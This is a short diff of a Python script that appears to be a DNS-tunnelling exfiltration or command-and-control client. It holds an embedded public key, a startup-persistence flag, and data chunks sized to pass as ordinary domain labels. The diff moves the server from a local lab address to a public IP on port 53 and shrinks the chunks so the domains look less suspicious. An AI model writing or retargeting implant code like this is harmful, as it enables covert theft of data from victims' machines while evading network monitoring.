@@ -14,9 +14,9 @@ MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEUnWlQdwMyM3H+bJdfJGRGAY/pfkD
 byS6+yVLuZj8YtvOsRb6mQyXBUUdvckfTDh5jdudZT9pMGJgWMhNPXlQ+w==
 -----END PUBLIC KEY-----"""
 target_pub_key = None
-CHUNK_SIZE = 23 # 19 data + 4 header -> 3 labels of 21 chars -> 5 total labels
+CHUNK_SIZE = 15 # 11 data + 4 header -> short 3-6 char labels, ~60 char domains
 IS_ADDED_TO_STARTUP = False
-SERVER = ("192.168.1.35", 27381)
+SERVER = ("20.63.24.136", 53)
 sent_chunks = {}
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 last_received_time = None
